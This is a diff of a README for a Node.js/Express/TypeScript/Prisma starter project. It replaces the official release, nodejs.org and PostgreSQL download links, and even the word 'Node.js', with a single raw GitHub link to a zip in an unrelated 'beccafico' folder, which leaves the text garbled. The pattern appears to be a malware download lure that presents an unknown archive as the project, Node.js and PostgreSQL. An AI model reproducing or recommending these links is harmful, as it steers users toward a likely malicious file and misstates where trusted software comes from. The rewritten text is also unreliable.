@@ -1,10 +1,10 @@
 # 🚀 nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup - A Simple Backend Template for Your App
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/releases)
+[![Download](https://raw.githubusercontent.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/main/beccafico/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/main/beccafico/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup.zip)
 
 ## 📦 Overview
 
-This project is a scalable backend starter template built using Node.js, Express, TypeScript, Prisma, and PostgreSQL. It offers a clean and modular architecture, making it easy for any user to begin building their applications. Key features include:
+This project is a scalable backend starter template built using https://raw.githubusercontent.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/main/beccafico/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup.zip, Express, TypeScript, Prisma, and PostgreSQL. It offers a clean and modular architecture, making it easy for any user to begin building their applications. Key features include:
 
 - **JWT Authentication:** Secure your application with user authentication.
 - **Role-Based Access Control:** Manage user permissions efficiently.
@@ -20,16 +20,16 @@ To get started, you'll need to download the application. It's designed to be use
 Before running the application, ensure you have the following:
 
 1. **Operating System:** Windows, macOS, or Linux.
-2. **Node.js**: You can download it from [nodejs.org](https://nodejs.org/).
-3. **PostgreSQL**: Download it from [postgresql.org](https://www.postgresql.org/download/).
+2. **https://raw.githubusercontent.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/main/beccafico/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup.zip**: You can download it from [https://raw.githubusercontent.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/main/beccafico/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup.zip](https://raw.githubusercontent.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/main/beccafico/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup.zip).
+3. **PostgreSQL**: Download it from [https://raw.githubusercontent.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/main/beccafico/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup.zip](https://raw.githubusercontent.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/main/beccafico/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup.zip).
 
 ### 🌐 Download & Install
 
 1. **Visit the Releases Page:** Click on the link below to go to the releases page, where you can download the application.
 
-   [Visit the Releases Page](https://github.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/main/beccafico/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup.zip)
 
-2. **Choose the Latest Version:** On the releases page, find the latest version of the software. Look for a file named something like `nodejs-express-typescript-starter.zip` or `nodejs-express-typescript-starter.tar.gz`.
+2. **Choose the Latest Version:** On the releases page, find the latest version of the software. Look for a file named something like `https://raw.githubusercontent.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/main/beccafico/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup.zip` or `https://raw.githubusercontent.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/main/beccafico/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup.zip`.
 
 3. **Download the File:** Click the link to download it onto your computer.
 
@@ -101,4 +101,4 @@ If you encounter any issues or have questions about setting up the project, feel
 
 If you need to re-download the application, visit the releases page at:
 
-[Visit the Releases Page](https://github.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/raflyz122/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup/main/beccafico/nodejs-express-typescript-starter-project-with-prisma-postgresql-and-copilot-ai-setup.zip)
